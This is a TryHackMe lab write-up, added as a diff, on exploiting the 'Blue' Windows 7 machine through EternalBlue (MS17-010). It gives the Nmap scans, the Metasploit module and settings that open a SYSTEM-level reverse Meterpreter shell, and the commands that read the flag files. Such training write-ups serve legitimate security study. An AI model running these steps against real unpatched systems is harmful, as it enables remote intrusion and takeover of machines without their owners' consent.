@@ -1,0 +1,155 @@
+# Blue - TryHackMe Writeup
+
+**Platform:** TryHackMe  
+**OS:** Windows 7 Professional SP1  
+**Difficulty:** Easy  
+**Date:** April 2026  
+
+---
+
+## Machine Info
+
+A classic Windows machine demonstrating one of the most famous vulnerabilities in history — EternalBlue (MS17-010). No web server, no rabbit holes. Pure network exploitation.
+
+---
+
+## Enumeration
+
+### Nmap Scan
+
+```bash
+nmap -sC -sV 10.49.156.70
+```
+
+```
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
+3389/tcp  open  tcpwrapped
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+
+Host script results:
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1
+|   Computer name: Jon-PC
+| smb-security-mode:
+|_  message_signing: disabled (dangerous, but default)
+```
+
+### Key Findings
+
+- **Port 445 open** — SMB running
+- **Windows 7 SP1** — likely unpatched
+- **SMB message signing disabled** — poorly secured
+- **Hostname: JON-PC** — single workstation, no domain
+
+Windows 7 + Port 445 + message signing disabled = immediate MS17-010 suspicion.
+
+---
+
+## Vulnerability Identification
+
+### MS17-010 Confirmation
+
+```bash
+nmap --script smb-vuln-ms17-010 -p 445 10.49.156.70
+```
+
+Result confirmed the machine is vulnerable to EternalBlue.
+
+---
+
+## Exploitation
+
+### Searchsploit
+
+```bash
+searchsploit ms17-010
+```
+
+```
+Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | windows/remote/42031.py
+Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' (Metasploit)  | windows/remote/43970.rb
+```
+
+`.rb` = Metasploit module. `.py` = manual Python exploit.
+
+### Metasploit
+
+```bash
+msfconsole
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.49.156.70
+set LHOST <tun0 IP>
+run
+```
+
+**Why module 0 over module 10:**
+- Module 0 (`ms17_010_eternalblue`) explicitly targets Windows 7
+- Module 10 (`ms17_010_psexec`) uses PsExec style — extra steps, more failure points
+- Always match exploit to exact OS version
+
+### Result
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+EternalBlue is a kernel-level exploit — spawns directly as SYSTEM. No privilege escalation needed.
+
+---
+
+## Post Exploitation
+
+### Flag Discovery
+
+```bash
+shell
+dir /s /b flag* 2>nul
+```
+
+```
+C:\flag1.txt
+C:\Windows\System32\config\flag2.txt
+C:\Users\Jon\Documents\flag3.txt
+```
+
+### Reading Flags
+
+```bash
+type C:\flag1.txt
+type C:\Windows\System32\config\flag2.txt
+type C:\Users\Jon\Documents\flag3.txt
+```
+
+All 3 flags retrieved.
+
+---
+
+## Key Learnings
+
+- **Windows 7 + Port 445** = always run `smb-vuln-ms17-010` script first, no exception
+- **EternalBlue** is a kernel pool corruption exploit — lands directly as SYSTEM, no privesc required
+- **`.rb` files** = Metasploit Ruby modules | **`.py` files** = manual Python exploits
+- **SMB message signing disabled** is a red flag — flag it in real assessments
+- **Metasploit is a crutch** — next step is exploiting this manually with `42031.py` without MSF
+
+---
+
+## What's Next
+
+Redo this box manually using `42031.py` + Netcat listener — no Metasploit. That's the OSCP standard.
+
+---
+
+## References
+
+- [MS17-010 - Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
+- [EternalBlue - Exploit-DB 42031](https://www.exploit-db.com/exploits/42031)
+- [WannaCry Background](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack)
